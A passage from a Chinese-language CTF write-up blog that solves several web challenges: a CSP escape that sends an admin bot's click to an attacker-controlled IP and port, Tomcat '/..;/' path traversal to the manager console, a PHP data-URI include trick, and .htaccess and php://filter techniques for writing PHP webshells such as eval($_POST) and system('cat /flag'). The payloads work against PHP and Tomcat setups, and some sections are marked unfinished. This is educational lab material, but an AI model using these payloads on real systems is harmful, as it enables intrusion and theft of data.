<p>也就是说我们可以这样子&lt;a/udio&gt;,而有趣的就是&lt;a/udio&gt;在浏览器里会解析成<a>标签，因为在标签中间的<code>/</code>会把后面注释掉了，从而变成<a>标签，我们知道超链接的跳转不受CSP的限制。</a></a></p>
<p>payload:</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[[npfs&quot;&gt;&lt;/audio&gt;&lt;a/udio id=&quot;like&quot; href=&quot;http:xxx.xxx.xxx.xxx:2333&quot;&gt;1&lt;/a/udio&gt;]]</span></span><br></pre></td></tr></table></figure>
<p>这里解释下这个payload,我们提交的payload经``render_tags()`作用，变成了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls <span class="attribute">src</span>=<span class="string">&quot;npfs&quot;</span>&gt;&lt;/audio&gt;&lt;a/udio <span class="attribute">id</span>=<span class="string">&quot;like&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;http:xxx.xxx.xxx.xxx:2333&quot;</span>&gt;1&lt;/a/udio&gt;&gt;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
<p>我们在worker.js中发现的</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">await</span> page.click(<span class="comment">&#x27;#like&#x27;);</span></span><br></pre></td></tr></table></figure>
<p>bot会点击<code>#like</code>，而现在我们能够通过标签的逃逸来自定义出一个超链接，只要在自定<code>&lt;a&gt;</code>中设置了like这个id，管理员bot就会带着flag来点击访问这个超链接，这时候就能得到flag了</p>
<p>nc监听即可</p>
<p><img src="https://img.npfs06.top/20210301214648.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><p>知识点：</p>
<ol>
<li>tomcat目录穿越</li>
<li>tomcat管理后台弱口令</li>
<li>后台上传war🐎</li>
<li>Cookie利用</li>
</ol>
<p>Orange 师傅在 BlackHat 上有个议题（<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=28xWcRegncw">DEF CON 26 – Orange Tsai – Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>），大意就是由于中间件的一些特性，导致了一些神奇的目录穿越现象。比如：</p>
<p><img src="https://img.npfs06.top/20210301220624.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>URL路径参数不规范引发的问题，能造成的危害如下</p>
<p><img src="https://img.npfs06.top/20210301220722.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>针对于本题的环境，题目是由 Nginx 做反向代理，真实的后端中间件是 Tomcat，两种中间件识别的路径不同，就会造成解析不一致的情况。引用 Orange 师傅的总结：</p>
<p><img src="https://img.npfs06.top/20210301221221.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>上图可知，Nginx 会解析<code> /a;evil/b/</code>，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据<code> ;.*</code>，所以 Tomcat 对此的解析是<code> /a/b/</code>。也就是说我们从可以通过写<code> ;+脏数据</code>的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径。对于本题来说，我们可以构造路径<code> /..;/</code>，Nginx 会认为我们要访问服务器的 /..;/ 目录下的内容，从而将这个请求视为合法请求发送给后端的 Tomcat 解析，Tomcat 接受之后认为 ; 是脏数据，从而过滤掉，解析的路径就变成了<code> /../</code> 也就是上级目录。所以访问<code>/..;/manager/html</code>之后我们就成功进入了后台界面。</p>
<p><img src="https://img.npfs06.top/20210301220751.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>&lt;—-未完成 待更—-&gt;</p>
<h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><p>使用arjun工具找到参数：hl</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hl&#x27;</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;mkdir -- &#x27;</span>.escapeshellarg(<span class="variable">$dir</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$randFolder</span> = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    <span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">    chdir(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$userFolder</span> = basename(str_replace([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line">    chdir(<span class="variable">$userFolder</span>);</span><br><span class="line">    file_put_contents(<span class="string">&#x27;profile&#x27;</span>,print_r(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上来先 ban 了 php 流，猜测是文件包含的题</p>
<p><img src="https://img.npfs06.top/20210302221008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>$mkdir 函数用的 system 函数调用 mkdir 命令，看起来有搞头，但是后面的 escapeshellarg 没法绕，暂时作罢</p>
<p><img src="https://img.npfs06.top/20210302221228.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>显然，这个system函数是很安全的，只好继续向下看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line">chdir(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br></pre></td></tr></table></figure>
<p>这三行应该是为了隔离每个用户的，防止互相干扰，继续向下</p>
<p>下面的 $userFolder 开始有趣了，从 X-Forwarded-For 头里拿目录名字作为 userFolder，并且过滤<code>.</code> 和 <code>-</code> 这两个符号。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = basename(str_replace([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br></pre></td></tr></table></figure>
<p>在往下看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;profile&#x27;</span>,print_r(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_put_contents 令人眼前一亮，把 $_SERVER 的所有数据写到 userFolder/profile 里，并且完全没有过滤,那么我们随便写一个 HTTP 头，传入任意 PHP 代码，可以造成 RCE</p>
<p>现在做的就是想办法绕过<code>&lt;?</code>和<code>php</code>，也就是这道题的考点了，include 与 file_get_contents 在关于 Data URI 处理问题上的问题，include () 与 file_get_contents () 支持Data URI，而且在处理的时候，出现了差异</p>
<p>首先看<code>file_get_contents</code>，会直接返回<code>data:,</code>之后的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// allow_url_include=On</span></span><br><span class="line"><span class="meta">&lt;?php</span>	</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">&quot;data:,123/profile&quot;</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">&quot;data:,profile&quot;</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210302231417.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>而在 allow_url_include=Off 的情况下，是不允许 include data URI 的，但是如果 <code>data:,XXX</code> 是一个目录名的话，可以绕过限制，包含<code>xxx</code>件，利用点就是这里</p>
<p>意思就是说</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当allow_url_include=<span class="type">Off</span>时</span><br><span class="line"></span><br><span class="line"><span class="title">file_get_contents</span>在处理<span class="class"><span class="keyword">data</span>:xxx时会直接取xxx</span></span><br><span class="line"></span><br><span class="line">而include会包含文件名为<span class="class"><span class="keyword">data</span>:xxx的文件</span></span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210302000127.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>知识点：.htaccess写入</p>
<p>似曾相识的题目，查了下以前写的wp,发现基本就是原题 [XNUCA2019Qualifier]EasyPHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对写入的文件，进行判断，不是index.php的话，就删除掉</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不存在content或filename，则高亮代码</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对content进行黑名单过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对filename进行黑名单过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//对写入的文件，进行判断，不是index.php的话，就删除掉</span></span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="comment">//在文件末尾追加hello,world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据题目的意思<code>只解析index.php</code>，想到以下方法：</p>
<h3 id="方法一、写入一句话木马到index-php"><a href="#方法一、写入一句话木马到index-php" class="headerlink" title="方法一、写入一句话木马到index.php"></a>方法一、写入一句话木马到index.php</h3><p>直接写入一句话木马到index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.php&amp;content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;npfs&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>蚁剑连接，找到flag即可。</p>
<h3 id="方法二、写入一个-user-ini让index-php自动包含上我们写入的马"><a href="#方法二、写入一个-user-ini让index-php自动包含上我们写入的马" class="headerlink" title="方法二、写入一个.user.ini让index.php自动包含上我们写入的马"></a>方法二、写入一个<code>.user.ini</code>让index.php自动包含上我们写入的马</h3><p><strong><code> file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code>,对于这里的末尾追加数据，我们考虑利用<code>\</code>绕过\n换行追加数据导致.htaccess解析错误的限制</strong></p>
<p><strong>我们可以利用#注释符将整句话都注视掉，但是又由于有\n换行符的存在，我们不能直接使用#就将其注释掉，需要把\n进行“吃”掉。那么最常见的操作就是利用\斜杠将其转义了，这样<code>\\n</code>就是一个简单的\n字符串了。</strong></p>
<p>.htaccess文件内容：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">.htaccess</span></span><br><span class="line"></span><br><span class="line"><span class="xml">php_value auto_prepend_fil\</span></span><br><span class="line"><span class="xml">e .htaccess</span></span><br><span class="line"><span class="xml">#</span><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><span class="xml">\</span></span><br></pre></td></tr></table></figure>
<p>至于最终对flag的读取，因为content中对flag进行了黑名单过滤，绕过很简单，这里就不多说了</p>
<p>最终payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%<span class="number">20</span>auto_prepend_fil\%<span class="number">0</span>ae%<span class="number">20.</span>htaccess%<span class="number">0</span>a%<span class="number">23</span><span class="meta">&lt;?php</span>%<span class="number">20</span>system(<span class="string">&#x27;cat%20/fla&#x27;</span>.<span class="string">&#x27;g&#x27;</span>);<span class="meta">?&gt;</span>\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>后来看了wp发现对于黑名单的绕过，还可以利用base64编码</p>
<p>p神的一篇文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a><br>提到file_put_contents函数中的第一个参数<code>$filename</code>，即写入的文件名是可以控制协议的，所以我们可以用<code>php://filter流</code>的<code>base64-decode</code>方法将文件内容参数<code>$content</code>进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。<br><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacker&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对要写入的content进行base64编码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;PD9waHAgcGhwaW5mbygpOyA/Pg==&#x27;</span></span><br></pre></td></tr></table></figure>
<p>测试payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=phpinfo.php&amp;content=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
<p>访问<code>phpinfo.php</code>，成功显示phpinfo信息。</p>
<hr>
<h3 id="方法四-：回溯绕过，利用php伪协议-写入WebShell"><a href="#方法四-：回溯绕过，利用php伪协议-写入WebShell" class="headerlink" title="方法四 ：回溯绕过，利用php伪协议 写入WebShell"></a>方法四 ：回溯绕过，利用php伪协议 写入WebShell</h3><p><strong>绕过preg_match</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code> ，因此存在了被绕过的可能。</p>
<p>思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由<code>pcre.backtrack_limit</code>参数来控制<br>PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过<code>php.ini</code>设置，也可以通过 <code>phpinfo</code>页面查看。</p>
<p>要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置<code>pcre.backtrack_limit</code>值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。<br>测试一下，是否能绕过preg_match：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>,<span class="number">0</span>);</span><br><span class="line">var_dump(preg_match(<span class="string">&#x27;/[^a-z\.]/&#x27;</span>,<span class="string">&#x27;php://filter&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//bool(false) </span></span><br></pre></td></tr></table></figure>
<p>因为php版本&gt;=7，所以需要特别设置<code>pcre.jit</code>这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得<code>pcre.backtrack_limit</code>这个环境变量能正常生效，绕过preg_match函数。</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">php_value pcre.backtrack_limit 0</span></span><br><span class="line"><span class="xml">php_value pcre.jit 0</span></span><br><span class="line"><span class="xml">php_value auto_append_file .htaccess</span></span><br><span class="line"><span class="xml">#</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="xml">\</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure>




<h2 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-总决赛-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 总决赛 Day1 Web3]Flask Message Board"></a>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h2><p>进入网站，为一个留言板服务，并且带有机器人过滤机制，页面底部有一个管理员入口但无法进入。</p>
<p>fuzz下，发现在Author处有回显</p>
<p><img src="https://img.npfs06.top/20210303174158.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在Author处写入,（这里存在长度限制）得到key，很明显的cookie伪造</p>
<p><img src="https://img.npfs06.top/20210303174243.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
